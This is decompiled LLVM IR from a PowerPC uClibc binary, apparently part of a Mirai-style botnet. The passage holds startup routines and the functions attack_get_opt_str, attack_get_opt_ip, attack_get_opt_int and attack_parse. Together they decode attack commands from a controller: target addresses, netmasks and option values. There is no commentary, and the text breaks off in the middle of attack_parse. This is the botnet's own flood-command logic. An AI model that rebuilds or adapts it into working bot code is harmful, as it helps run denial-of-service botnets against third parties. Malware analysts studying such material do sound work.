@global_var_10023810.592 = local_unnamed_addr global i32 0
@global_var_1002380c.593 = local_unnamed_addr global i32 0
@global_var_1002381c.594 = local_unnamed_addr global i32 0
@global_var_1000ff14.595 = constant i32 939524097
@global_var_10021058.596 = global i32 0
@global_var_10021278.2 = local_unnamed_addr global i8 0
@global_var_100211d8.12 = local_unnamed_addr global i8 0
@global_var_100211d9.15 = global i8 0
@global_var_10021070.119 = local_unnamed_addr global i8 1
@global_var_100211f0.138 = local_unnamed_addr global i16 0
@global_var_100211fc.155 = global i16 0
@global_var_100212ba.170 = local_unnamed_addr global i16 0
@global_var_100210bc.523 = global i16 288
@global_var_10021100.524 = local_unnamed_addr global i16 272

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000c4.1 to i32), i32* @lr, align 4
  %v0_100000c0 = call i32 @frame_dummy()
  store i32 %v0_100000c0, i32* @r3, align 4
  store i32 268435656, i32* @lr, align 4
  %v1_100000c4 = call i32 @__do_global_ctors_aux(i32 %v0_100000c0)
  ret i32 %v1_100000c4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000ec = load i8, i8* @global_var_10021278.2, align 1
  %v3_100000f4 = icmp eq i8 %v3_100000ec, 0
  br i1 %v3_100000f4, label %dec_label_pc_100000fc, label %dec_label_pc_10000158

dec_label_pc_100000fc:                            ; preds = %entry
  %v3_10000104 = load i32, i32* bitcast (i32** @global_var_1002106c.5 to i32*), align 4
  %v3_1000010c = icmp eq i32 %v3_10000104, 0
  br i1 %v3_1000010c, label %dec_label_pc_10000134, label %dec_label_pc_10000114

dec_label_pc_10000114:                            ; preds = %dec_label_pc_100000fc, %dec_label_pc_10000114
  %v0_10000118 = phi i32 [ %v3_10000124, %dec_label_pc_10000114 ], [ %v3_10000104, %dec_label_pc_100000fc ]
  %v1_10000114 = add i32 %v0_10000118, 4
  store i32 %v1_10000114, i32* bitcast (i32** @global_var_1002106c.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_10000118)
  %v3_10000124 = load i32, i32* bitcast (i32** @global_var_1002106c.5 to i32*), align 4
  %v3_1000012c = icmp eq i32 %v3_10000124, 0
  br i1 %v3_1000012c, label %dec_label_pc_10000134, label %dec_label_pc_10000114

dec_label_pc_10000134:                            ; preds = %dec_label_pc_10000114, %dec_label_pc_100000fc
  store i8 1, i8* @global_var_10021278.2, align 1
  br label %dec_label_pc_10000158

dec_label_pc_10000158:                            ; preds = %entry, %dec_label_pc_10000134
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000124, { 1, 0 }
  uselistorder i8* @global_var_10021278.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000158, { 1, 0 }
  uselistorder label %dec_label_pc_10000114, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000188 = load i32, i32* @r3, align 4
  ret i32 %v0_10000188
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001c4 = load i32, i32* @global_var_10021064.9, align 4
  %v3_100001cc = icmp eq i32 %v3_100001c4, 0
  br i1 %v3_100001cc, label %dec_label_pc_100001ec, label %dec_label_pc_100001d4

dec_label_pc_100001d4:                            ; preds = %entry
  br label %dec_label_pc_100001ec

dec_label_pc_100001ec:                            ; preds = %dec_label_pc_100001d4, %entry
  ret i32 ptrtoint (i32* @global_var_10021064.9 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_10000214 = load i32, i32* @r3, align 4
  ret i32 %v0_10000214
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_1000021c = load i32, i32* @r1, align 4
  %v1_1000021c = call i32 @__asm_rlwinm(i32 %v0_1000021c, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000022c = add i32 %v1_1000021c, -16
  %v3_1000022c = inttoptr i32 %v2_1000022c to i32*
  store i32 %v1_1000021c, i32* %v3_1000022c, align 4
  %v0_10000230 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000230, i32* %v3_1000022c, align 4
  %v2_10000238 = load i32, i32* %stack_var_0, align 4
  %v7_1000025c = call i32 @__uClibc_main(i32 268461680, i32 %v2_10000238, i32* nonnull %stack_var_4, i32 268435636, i32 268501020, i32 %arg1)
  ret i32 %v7_1000025c

; uselistorder directives
  uselistorder i32 %v1_1000021c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v3_10000260 = icmp eq i32 %arg1, 0
  store i32 %arg1, i32* %ctr.global-to-local, align 4
  %v0_1000026c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10000260, i32 %v0_1000026c)
  %v1_10000270 = add i32 %tmp, 4
  %v2_10000270 = inttoptr i32 %v1_10000270 to i8*
  %v3_10000270 = load i8, i8* %v2_10000270, align 1
  %v4_10000270 = zext i8 %v3_10000270 to i32
  %v4_10000278 = icmp eq i32 %v4_10000270, %arg3
  br i1 %v4_10000278, label %dec_label_pc_100002a0, label %dec_label_pc_10000294.preheader

dec_label_pc_10000294.preheader:                  ; preds = %entry
  %v0_10000298.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000284:                            ; preds = %dec_label_pc_10000294
  %v1_10000284 = add i32 %v0_10000284.in, 12
  %v2_10000284 = inttoptr i32 %v1_10000284 to i8*
  %v3_10000284 = load i8, i8* %v2_10000284, align 1
  %v4_10000284 = zext i8 %v3_10000284 to i32
  %v4_1000028c = icmp eq i32 %v4_10000284, %arg3
  br i1 %v4_1000028c, label %dec_label_pc_100002a0, label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %dec_label_pc_10000294.preheader, %dec_label_pc_10000284
  %v0_10000298 = phi i32 [ %v0_10000298.pre, %dec_label_pc_10000294.preheader ], [ %v1_10000298, %dec_label_pc_10000284 ]
  %v0_10000284.in = phi i32 [ %tmp, %dec_label_pc_10000294.preheader ], [ %v0_10000284, %dec_label_pc_10000284 ]
  %v0_10000284 = add i32 %v0_10000284.in, 8
  %v1_10000298 = add i32 %v0_10000298, -1
  store i32 %v1_10000298, i32* %ctr.global-to-local, align 4
  %v2_10000298 = icmp eq i32 %v1_10000298, 0
  br i1 %v2_10000298, label %dec_label_pc_1000029c, label %dec_label_pc_10000284

dec_label_pc_1000029c:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg4

dec_label_pc_100002a0:                            ; preds = %dec_label_pc_10000284, %entry
  %v0_100002a0 = phi i32 [ %tmp, %entry ], [ %v0_10000284, %dec_label_pc_10000284 ]
  %v1_100002a0 = inttoptr i32 %v0_100002a0 to i32*
  %v2_100002a0 = load i32, i32* %v1_100002a0, align 4
  ret i32 %v2_100002a0

; uselistorder directives
  uselistorder i32 %v1_10000298, { 2, 1, 0 }
  uselistorder i32 %v0_10000284.in, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v3_100002b4 = icmp eq i32 %arg1, 0
  br i1 %v3_100002b4, label %dec_label_pc_100002ec, label %dec_label_pc_100002c0

dec_label_pc_100002c0:                            ; preds = %entry
  %v0_100002c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100002c0 = add i32 %v0_100002c0, 4
  %v2_100002c0 = inttoptr i32 %v1_100002c0 to i8*
  %v3_100002c0 = load i8, i8* %v2_100002c0, align 1
  %v4_100002c0 = zext i8 %v3_100002c0 to i32
  %v4_100002c8 = icmp eq i32 %v4_100002c0, %arg3
  br i1 %v4_100002c8, label %dec_label_pc_10000300, label %dec_label_pc_100002e4

dec_label_pc_100002d4:                            ; preds = %dec_label_pc_100002e4
  %v1_100002d4 = add i32 %v0_100002d4.in, 12
  %v2_100002d4 = inttoptr i32 %v1_100002d4 to i8*
  %v3_100002d4 = load i8, i8* %v2_100002d4, align 1
  %v4_100002d4 = zext i8 %v3_100002d4 to i32
  %v4_100002dc = icmp eq i32 %v4_100002d4, %arg3
  br i1 %v4_100002dc, label %dec_label_pc_10000300, label %dec_label_pc_100002e4

dec_label_pc_100002e4:                            ; preds = %dec_label_pc_100002c0, %dec_label_pc_100002d4
  %v0_100002e8 = phi i32 [ %v1_100002e8, %dec_label_pc_100002d4 ], [ %arg1, %dec_label_pc_100002c0 ]
  %v0_100002d4.in = phi i32 [ %v0_100002d4, %dec_label_pc_100002d4 ], [ %v0_100002c0, %dec_label_pc_100002c0 ]
  %v0_100002d4 = add i32 %v0_100002d4.in, 8
  store i32 %v0_100002d4, i32* %r4.global-to-local, align 4
  %v1_100002e8 = add i32 %v0_100002e8, -1
  %v2_100002e8 = icmp eq i32 %v1_100002e8, 0
  br i1 %v2_100002e8, label %dec_label_pc_100002ec, label %dec_label_pc_100002d4

dec_label_pc_100002ec:                            ; preds = %dec_label_pc_100002e4, %dec_label_pc_10000300, %entry
  ret i32 %arg4

dec_label_pc_10000300:                            ; preds = %dec_label_pc_100002d4, %dec_label_pc_100002c0
  %v0_10000300 = phi i32 [ %v0_100002c0, %dec_label_pc_100002c0 ], [ %v0_100002d4, %dec_label_pc_100002d4 ]
  %v1_10000300 = inttoptr i32 %v0_10000300 to i32*
  %v2_10000300 = load i32, i32* %v1_10000300, align 4
  %v3_10000304 = icmp eq i32 %v2_10000300, 0
  br i1 %v3_10000304, label %dec_label_pc_100002ec, label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_10000300
  store i32 268436240, i32* @lr, align 4
  %v1_1000030c = call i32 @inet_addr(i32 %v2_10000300)
  ret i32 %v1_1000030c

; uselistorder directives
  uselistorder i32 %v1_100002e8, { 1, 0 }
  uselistorder i32 %v0_100002d4, { 1, 0, 2 }
  uselistorder i32 %v0_100002d4.in, { 1, 0 }
  uselistorder i32 %v0_100002c0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100002ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100002e4, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v3_10000334 = icmp eq i32 %arg1, 0
  br i1 %v3_10000334, label %dec_label_pc_1000036c, label %dec_label_pc_10000340

dec_label_pc_10000340:                            ; preds = %entry
  %v0_10000340 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000340 = add i32 %v0_10000340, 4
  %v2_10000340 = inttoptr i32 %v1_10000340 to i8*
  %v3_10000340 = load i8, i8* %v2_10000340, align 1
  %v4_10000340 = zext i8 %v3_10000340 to i32
  %v4_10000348 = icmp eq i32 %v4_10000340, %arg3
  br i1 %v4_10000348, label %dec_label_pc_10000380, label %dec_label_pc_10000364

dec_label_pc_10000354:                            ; preds = %dec_label_pc_10000364
  %v1_10000354 = add i32 %v0_10000354.in, 12
  %v2_10000354 = inttoptr i32 %v1_10000354 to i8*
  %v3_10000354 = load i8, i8* %v2_10000354, align 1
  %v4_10000354 = zext i8 %v3_10000354 to i32
  %v4_1000035c = icmp eq i32 %v4_10000354, %arg3
  br i1 %v4_1000035c, label %dec_label_pc_10000380, label %dec_label_pc_10000364

dec_label_pc_10000364:                            ; preds = %dec_label_pc_10000340, %dec_label_pc_10000354
  %v0_10000368 = phi i32 [ %v1_10000368, %dec_label_pc_10000354 ], [ %arg1, %dec_label_pc_10000340 ]
  %v0_10000354.in = phi i32 [ %v0_10000354, %dec_label_pc_10000354 ], [ %v0_10000340, %dec_label_pc_10000340 ]
  %v0_10000354 = add i32 %v0_10000354.in, 8
  store i32 %v0_10000354, i32* %r4.global-to-local, align 4
  %v1_10000368 = add i32 %v0_10000368, -1
  %v2_10000368 = icmp eq i32 %v1_10000368, 0
  br i1 %v2_10000368, label %dec_label_pc_1000036c, label %dec_label_pc_10000354

dec_label_pc_1000036c:                            ; preds = %dec_label_pc_10000364, %dec_label_pc_10000380, %entry
  ret i32 %arg4

dec_label_pc_10000380:                            ; preds = %dec_label_pc_10000354, %dec_label_pc_10000340
  %v0_10000380 = phi i32 [ %v0_10000340, %dec_label_pc_10000340 ], [ %v0_10000354, %dec_label_pc_10000354 ]
  %v1_10000380 = inttoptr i32 %v0_10000380 to i32*
  %v2_10000380 = load i32, i32* %v1_10000380, align 4
  store i32 %v2_10000380, i32* @r3, align 4
  %v3_10000384 = icmp eq i32 %v2_10000380, 0
  br i1 %v3_10000384, label %dec_label_pc_1000036c, label %dec_label_pc_1000038c

dec_label_pc_1000038c:                            ; preds = %dec_label_pc_10000380
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268436372, i32* @lr, align 4
  %v2_10000390 = call i32 @util_atoi(i32 %v2_10000380, i32 10)
  ret i32 %v2_10000390

; uselistorder directives
  uselistorder i32 %v1_10000368, { 1, 0 }
  uselistorder i32 %v0_10000354, { 1, 0, 2 }
  uselistorder i32 %v0_10000354.in, { 1, 0 }
  uselistorder i32 %v0_10000340, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000036c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000364, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100003b0 = load i32, i32* @lr, align 4
  store i32 %v0_100003b0, i32* %r0.global-to-local, align 4
  %v0_100003b8 = load i32, i32* %r3.global-to-local, align 4
  %v0_100003c0 = load i32, i32* @r21, align 4
  %v0_100003c4 = load i32, i32* @r22, align 4
  %v0_100003c8 = load i32, i32* @r23, align 4
  %v0_100003cc = load i32, i32* @r24, align 4
  %v0_100003d0 = load i32, i32* @r25, align 4
  %v0_100003dc = load i32, i32* @r28, align 4
  %v0_100003e0 = load i32, i32* @r29, align 4
  %v0_100003e4 = load i32, i32* @r30, align 4
  %tmp31 = icmp ult i32 %arg2, 4
  br i1 %tmp31, label %dec_label_pc_10000400, label %dec_label_pc_100003f4

dec_label_pc_100003f4:                            ; preds = %entry
  %v3_100003f4 = icmp eq i32 %arg2, 4
  %v1_100003f8 = inttoptr i32 %v0_100003b8 to i32*
  %v2_100003f8 = load i32, i32* %v1_100003f8, align 4
  store i32 %v2_100003f8, i32* @r23, align 4
  br i1 %v3_100003f4, label %dec_label_pc_10000400, label %dec_label_pc_10000440

dec_label_pc_10000400:                            ; preds = %dec_label_pc_100005d0.dec_label_pc_10000400_crit_edge, %dec_label_pc_100003f4, %dec_label_pc_10000458, %dec_label_pc_1000044c, %dec_label_pc_10000440, %entry
  %v0_1000043c = phi i32 [ %v0_1000043c.pre, %dec_label_pc_100005d0.dec_label_pc_10000400_crit_edge ], [ %v0_100003b8, %dec_label_pc_100003f4 ], [ %v0_100003b8, %dec_label_pc_10000458 ], [ %v0_100003b8, %dec_label_pc_1000044c ], [ %v0_100003b8, %dec_label_pc_10000440 ], [ %v0_100003b8, %entry ]
  store i32 %v0_100003b0, i32* %r0.global-to-local, align 4
  store i32 %v0_100003c0, i32* @r21, align 4
  store i32 %v0_100003c4, i32* @r22, align 4
  store i32 %v0_100003c8, i32* @r23, align 4
  store i32 %v0_100003cc, i32* @r24, align 4
  store i32 %v0_100003d0, i32* @r25, align 4
  store i32 %v0_100003dc, i32* @r28, align 4
  store i32 %v0_100003e0, i32* @r29, align 4
  store i32 %v0_100003e4, i32* @r30, align 4
  ret i32 %v0_1000043c

dec_label_pc_10000440:                            ; preds = %dec_label_pc_100003f4
  %v3_10000440 = icmp eq i32 %arg2, 5
  %v1_10000444 = add i32 %v0_100003b8, 4
  %v2_10000444 = inttoptr i32 %v1_10000444 to i8*
  %v3_10000444 = load i8, i8* %v2_10000444, align 1
  %v4_10000444 = zext i8 %v3_10000444 to i32
  store i32 %v4_10000444, i32* @r21, align 4
  br i1 %v3_10000440, label %dec_label_pc_10000400, label %dec_label_pc_1000044c

dec_label_pc_1000044c:                            ; preds = %dec_label_pc_10000440
  %v1_1000044c = add i32 %v0_100003b8, 5
  %v2_1000044c = inttoptr i32 %v1_1000044c to i8*
  %v3_1000044c = load i8, i8* %v2_1000044c, align 1
  %v4_1000044c = zext i8 %v3_1000044c to i32
  store i32 %v4_1000044c, i32* @r25, align 4
  %v3_10000450 = icmp eq i8 %v3_1000044c, 0
  br i1 %v3_10000450, label %dec_label_pc_10000400, label %dec_label_pc_10000458

dec_label_pc_10000458:                            ; preds = %dec_label_pc_1000044c
  %v1_10000458 = mul nuw nsw i32 %v4_1000044c, 5
  store i32 %v1_10000458, i32* @r30, align 4
  %v1_1000045c = add i32 %arg2, -6
  store i32 %v1_1000045c, i32* %r0.global-to-local, align 4
  %v2_10000460 = icmp ult i32 %v1_1000045c, %v1_10000458
  br i1 %v2_10000460, label %dec_label_pc_10000400, label %dec_label_pc_10000468

dec_label_pc_10000468:                            ; preds = %dec_label_pc_10000458
  store i32 %v4_1000044c, i32* %r3.global-to-local, align 4
  store i32 %v1_1000045c, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1000047c.10 to i32), i32* @lr, align 4
  %v2_10000478 = call i32 @calloc(i32 %v4_1000044c, i32 24)
  store i32 -858993459, i32* %r0.global-to-local, align 4
  %v0_10000484 = load i32, i32* @r30, align 4
  %tmp32 = mul i32 %v0_10000484, -858993459
  store i32 %v2_10000478, i32* %r20.global-to-local, align 4
  store i32 %v2_10000478, i32* %r10.global-to-local, align 4
  %v0_10000494 = load i32, i32* @r31, align 4
  store i32 %v0_10000494, i32* %r3.global-to-local, align 4
  store i32 %tmp32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100004a0

dec_label_pc_100004a0:                            ; preds = %dec_label_pc_100004a0.dec_label_pc_100004a0_crit_edge, %dec_label_pc_10000468
  %v2_100004b0 = phi i32 [ %v1_100004c4, %dec_label_pc_100004a0.dec_label_pc_100004a0_crit_edge ], [ %v2_10000478, %dec_label_pc_10000468 ]
  %v0_100004a8 = phi i32 [ %v0_100004a0.pre, %dec_label_pc_100004a0.dec_label_pc_100004a0_crit_edge ], [ %v0_10000494, %dec_label_pc_10000468 ]
  %v1_100004a0 = add i32 %v0_100004a8, 4
  %v2_100004a0 = inttoptr i32 %v1_100004a0 to i8*
  %v3_100004a0 = load i8, i8* %v2_100004a0, align 1
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100004a8 = inttoptr i32 %v0_100004a8 to i32*
  %v2_100004a8 = load i32, i32* %v1_100004a8, align 4
  store i32 %v2_100004a8, i32* %r0.global-to-local, align 4
  %v0_100004ac = load i32, i32* @r28, align 4
  %v1_100004ac = add i32 %v0_100004ac, -5
  store i32 %v1_100004ac, i32* @r28, align 4
  %v3_100004b0 = add i32 %v2_100004b0, 20
  %v4_100004b0 = inttoptr i32 %v3_100004b0 to i8*
  store i8 %v3_100004a0, i8* %v4_100004b0, align 1
  %v0_100004b4 = load i32, i32* @r31, align 4
  %v1_100004b4 = add i32 %v0_100004b4, 5
  store i32 %v1_100004b4, i32* @r31, align 4
  %v0_100004b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100004b8 = trunc i32 %v0_100004b8 to i16
  %v2_100004b8 = load i32, i32* %r10.global-to-local, align 4
  %v3_100004b8 = inttoptr i32 %v2_100004b8 to i16*
  store i16 %v1_100004b8, i16* %v3_100004b8, align 2
  %v0_100004bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100004bc = load i32, i32* %r10.global-to-local, align 4
  %v2_100004bc = add i32 %v1_100004bc, 4
  %v3_100004bc = inttoptr i32 %v2_100004bc to i32*
  store i32 %v0_100004bc, i32* %v3_100004bc, align 4
  %v0_100004c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100004c0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100004c0 = add i32 %v1_100004c0, 16
  %v3_100004c0 = inttoptr i32 %v2_100004c0 to i32*
  store i32 %v0_100004c0, i32* %v3_100004c0, align 4
  %v0_100004c4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100004c4 = add i32 %v0_100004c4, 24
  store i32 %v1_100004c4, i32* %r10.global-to-local, align 4
  %v0_100004c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100004c8 = add i32 %v0_100004c8, -1
  store i32 %v1_100004c8, i32* %ctr.global-to-local, align 4
  %v2_100004c8 = icmp eq i32 %v1_100004c8, 0
  br i1 %v2_100004c8, label %dec_label_pc_100004cc, label %dec_label_pc_100004a0.dec_label_pc_100004a0_crit_edge

dec_label_pc_100004a0.dec_label_pc_100004a0_crit_edge: ; preds = %dec_label_pc_100004a0
  %v0_100004a0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100004a0

dec_label_pc_100004cc:                            ; preds = %dec_label_pc_100004a0
  %v0_100004cc = load i32, i32* @r28, align 4
  %v3_100004cc = icmp eq i32 %v0_100004cc, 0
  store i32 0, i32* @r29, align 4
  br i1 %v3_100004cc, label %dec_label_pc_100005c0, label %dec_label_pc_100004d8

dec_label_pc_100004d8:                            ; preds = %dec_label_pc_100004cc
  %v0_100004d8 = load i32, i32* @r30, align 4
  %v1_100004d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_100004d8 = add i32 %v1_100004d8, %v0_100004d8
  %v3_100004d8 = inttoptr i32 %v2_100004d8 to i8*
  %v4_100004d8 = load i8, i8* %v3_100004d8, align 1
  %v5_100004d8 = zext i8 %v4_100004d8 to i32
  store i32 %v5_100004d8, i32* @r30, align 4
  %v1_100004dc = add i32 %v0_100004cc, -1
  store i32 %v1_100004dc, i32* @r28, align 4
  %v3_100004e0 = icmp eq i8 %v4_100004d8, 0
  br i1 %v3_100004e0, label %dec_label_pc_100005a8, label %dec_label_pc_100004e8

dec_label_pc_100004e8:                            ; preds = %dec_label_pc_100004d8
  store i32 %v5_100004d8, i32* %r3.global-to-local, align 4
  store i32 268436724, i32* @lr, align 4
  %v2_100004f0 = call i32 @calloc(i32 %v5_100004d8, i32 8)
  store i32 %v2_100004f0, i32* %r3.global-to-local, align 4
  %v0_100004f4 = load i32, i32* @r28, align 4
  %v3_100004f4 = icmp eq i32 %v0_100004f4, 0
  store i32 %v2_100004f0, i32* @r29, align 4
  br i1 %v3_100004f4, label %dec_label_pc_100005c0, label %dec_label_pc_10000500

dec_label_pc_10000500:                            ; preds = %dec_label_pc_100004e8
  %v0_10000500 = load i32, i32* @r31, align 4
  %v1_10000500 = add i32 %v0_10000500, 1
  %v2_10000500 = inttoptr i32 %v1_10000500 to i8*
  %v3_10000500 = load i8, i8* %v2_10000500, align 1
  store i32 %v1_10000500, i32* %r3.global-to-local, align 4
  %v3_10000508 = add i32 %v2_100004f0, 4
  %v4_10000508 = inttoptr i32 %v3_10000508 to i8*
  store i8 %v3_10000500, i8* %v4_10000508, align 1
  %v0_1000050c = load i32, i32* @r28, align 4
  %v1_1000050c = add i32 %v0_1000050c, -1
  store i32 %v1_1000050c, i32* %r0.global-to-local, align 4
  %v4_1000050c = icmp eq i32 %v1_1000050c, 0
  br i1 %v4_1000050c, label %dec_label_pc_100005c0, label %dec_label_pc_10000514

dec_label_pc_10000514:                            ; preds = %dec_label_pc_10000500
  %v0_10000514 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000514 = add i32 %v0_10000514, 1
  %v2_10000514 = inttoptr i32 %v1_10000514 to i8*
  %v3_10000514 = load i8, i8* %v2_10000514, align 1
  %v4_10000514 = zext i8 %v3_10000514 to i32
  %v1_1000051c = add i32 %v0_1000050c, -2
  store i32 %v1_1000051c, i32* @r26, align 4
  store i32 %v1_10000514, i32* %r3.global-to-local, align 4
  %v2_10000524 = icmp slt i32 %v1_1000051c, %v4_10000514
  br i1 %v2_10000524, label %dec_label_pc_100005c0, label %dec_label_pc_1000052c

dec_label_pc_1000052c:                            ; preds = %dec_label_pc_10000514
  %v1_1000052c = add i32 %v0_10000514, 2
  store i32 %v1_1000052c, i32* @r27, align 4
  %v0_10000530 = load i32, i32* @r29, align 4
  %v1_10000530 = add i32 %v0_10000530, 8
  store i32 %v1_10000530, i32* @r24, align 4
  store i32 %v0_10000530, i32* @r28, align 4
  store i32 0, i32* @r22, align 4
  br label %dec_label_pc_10000580

dec_label_pc_10000540:                            ; preds = %dec_label_pc_10000580
  %v0_10000540 = load i32, i32* @r31, align 4
  %v1_10000540 = load i32, i32* @r26, align 4
  %v2_10000540 = sub i32 %v1_10000540, %v0_10000540
  store i32 %v2_10000540, i32* %r0.global-to-local, align 4
  %v5_10000540 = icmp eq i32 %v2_10000540, 0
  store i32 %v2_10000540, i32* %ctr.global-to-local, align 4
  br i1 %v5_10000540, label %dec_label_pc_100005c0, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_10000540
  %v1_1000054c = load i32, i32* @r27, align 4
  %v2_1000054c = add i32 %v1_1000054c, %v0_10000540
  %v3_1000054c = inttoptr i32 %v2_1000054c to i8*
  %v4_1000054c = load i8, i8* %v3_1000054c, align 1
  %v5_1000054c = zext i8 %v4_1000054c to i32
  store i32 %v5_1000054c, i32* %r0.global-to-local, align 4
  %v0_10000550 = load i32, i32* @r24, align 4
  store i32 %v0_10000550, i32* @r28, align 4
  store i32 %v2_1000054c, i32* %r3.global-to-local, align 4
  %v3_10000558 = add i32 %v0_10000550, 4
  %v4_10000558 = inttoptr i32 %v3_10000558 to i8*
  store i8 %v4_1000054c, i8* %v4_10000558, align 1
  %v0_1000055c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000055c = add i32 %v0_1000055c, -1
  store i32 %v1_1000055c, i32* %ctr.global-to-local, align 4
  %v2_1000055c = icmp eq i32 %v1_1000055c, 0
  br i1 %v2_1000055c, label %dec_label_pc_100005c0, label %dec_label_pc_10000560

dec_label_pc_10000560:                            ; preds = %dec_label_pc_1000054c
  %v0_10000564 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000564 = add i32 %v0_10000564, 1
  %v2_10000564 = inttoptr i32 %v1_10000564 to i8*
  %v3_10000564 = load i8, i8* %v2_10000564, align 1
  %v4_10000564 = zext i8 %v3_10000564 to i32
  %v0_10000568 = load i32, i32* @r24, align 4
  %v1_10000568 = add i32 %v0_10000568, 8
  store i32 %v1_10000568, i32* @r24, align 4
  store i32 %v1_10000564, i32* %r3.global-to-local, align 4
  %v1_10000570 = add i32 %v0_1000055c, -2
  store i32 %v1_10000570, i32* @r26, align 4
  %v2_10000574 = icmp slt i32 %v1_10000570, %v4_10000564
  br i1 %v2_10000574, label %dec_label_pc_100005c0, label %dec_label_pc_1000057c

dec_label_pc_1000057c:                            ; preds = %dec_label_pc_10000560
  %v1_1000057c = add i32 %v0_10000564, 2
  store i32 %v1_1000057c, i32* @r27, align 4
  br label %dec_label_pc_10000580

dec_label_pc_10000580:                            ; preds = %dec_label_pc_1000052c, %dec_label_pc_1000057c
  %v0_10000584 = phi i32 [ %v4_10000514, %dec_label_pc_1000052c ], [ %v4_10000564, %dec_label_pc_1000057c ]
  %v1_10000584 = add nuw nsw i32 %v0_10000584, 1
  store i32 %v1_10000584, i32* %r3.global-to-local, align 4
  store i32 268436876, i32* @lr, align 4
  %v2_10000588 = call i32 @calloc(i32 %v1_10000584, i32 1)
  store i32 %v2_10000588, i32* %r3.global-to-local, align 4
  %v0_1000058c = load i32, i32* @r22, align 4
  %v1_1000058c = add i32 %v0_1000058c, 1
  store i32 %v1_1000058c, i32* @r22, align 4
  %v1_10000590 = load i32, i32* @r28, align 4
  %v2_10000590 = inttoptr i32 %v1_10000590 to i32*
  store i32 %v2_10000588, i32* %v2_10000590, align 4
  %v0_10000594 = load i32, i32* @r27, align 4
  %v0_10000598 = load i32, i32* @r31, align 4
  store i32 268436896, i32* @lr, align 4
  %v3_1000059c = call i32 @util_memcpy(i32 %v2_10000588, i32 %v0_10000594, i32 %v0_10000598)
  store i32 %v3_1000059c, i32* %r3.global-to-local, align 4
  %v0_100005a0 = load i32, i32* @r22, align 4
  %v1_100005a0 = load i32, i32* @r30, align 4
  %v4_100005a0 = icmp eq i32 %v0_100005a0, %v1_100005a0
  br i1 %v4_100005a0, label %dec_label_pc_100005a8, label %dec_label_pc_10000540

dec_label_pc_100005a8:                            ; preds = %dec_label_pc_10000580, %dec_label_pc_100004d8
  %v0_100005a8 = call i32 @__GI___errno_location()
  store i32 %v0_100005a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
